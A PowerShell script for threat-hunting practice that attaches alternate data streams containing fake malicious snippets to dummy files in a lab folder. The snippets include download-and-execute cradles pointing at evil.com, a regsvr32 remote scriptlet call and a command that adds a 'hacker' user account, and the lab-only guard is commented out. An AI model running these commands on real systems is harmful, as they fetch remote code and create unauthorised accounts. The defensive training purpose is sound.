# Create-RandomADS.ps1
# Generates random Alternate Data Streams (ADS) on files for threat hunting practice

# Safety check: Ensure script runs in a lab environment
<#$computerName = $env:COMPUTERNAME
if ($computerName -notlike "*LAB*") {
    Write-Warning "This script should only run in a lab environment (e.g., computer name with 'LAB'). Exiting."
    exit
}
#>
# Define target directory and number of ADS to create
$targetDir = "C:\LabFiles"
$numADS = 5

# Ensure target directory exists
if (-not (Test-Path $targetDir)) {
    New-Item -Path $targetDir -ItemType Directory -Force
}

# Create or select files to attach ADS
$files = Get-ChildItem -Path $targetDir -File
if ($files.Count -lt $numADS) {
    # Create additional dummy files if needed
    for ($i = $files.Count; $i -lt $numADS; $i++) {
        $dummyFile = Join-Path $targetDir "DummyFile$i.txt"
        Set-Content -Path $dummyFile -Value "This is a dummy file for ADS testing."
    }
    $files = Get-ChildItem -Path $targetDir -File
}

# Array of potential ADS names to simulate malicious behavior
$adsNames = @(
    "hidden.exe", "secret.dll", "malware.dat", "backdoor.ps1", "cmd.exe", 
    "payload.bin", "keylog.txt", "stealth.vbs", "trojan.js", "config.ini"
)

# Array of potential malicious content snippets
$maliciousContent = @(
    "Invoke-Expression (IEX) 'malicious code'", 
    "powershell -ep bypass -c 'iex (new-object net.webclient).downloadstring('http://evil.com/payload')'",
    "rundll32.exe shell32.dll,Control_RunDLL",
    "regsvr32 /s /u /i:http://evil.com/malware.sct scrobj.dll",
    "Start-Process -FilePath 'cmd.exe' -ArgumentList '/c net user hacker Password123! /add'"
)

# Create random ADS on selected files
for ($i = 0; $i -lt $numADS; $i++) {
    $file = $files[$i % $files.Count]
    $randomADSName = $adsNames | Get-Random
    $randomContent = $maliciousContent | Get-Random
    
    # Attach ADS to the file
    $adsPath = "$($file.FullName):$randomADSName"
    Set-Content -Path $adsPath -Value $randomContent -ErrorAction SilentlyContinue
    
    if (Test-Path $adsPath -PathType Leaf) {
        Write-Output "Created ADS on $($file.FullName): $randomADSName with content: $randomContent"
    } else {
        Write-Warning "Failed to create ADS on $($file.FullName): $randomADSName"
    }
}

# Verify ADS creation
Write-Output "`nVerifying created ADS..."
Get-ChildItem -Path $targetDir -Recurse | ForEach-Object {
    $file = $_
    Get-Item -Path $file.FullName -Stream * | Where-Object { $_.Stream -ne ':$DATA' -and $_.Stream -ne 'Zone.Identifier' } | ForEach-Object {
        Write-Output "Found ADS: $($file.FullName):$($_.Stream)"
    }
}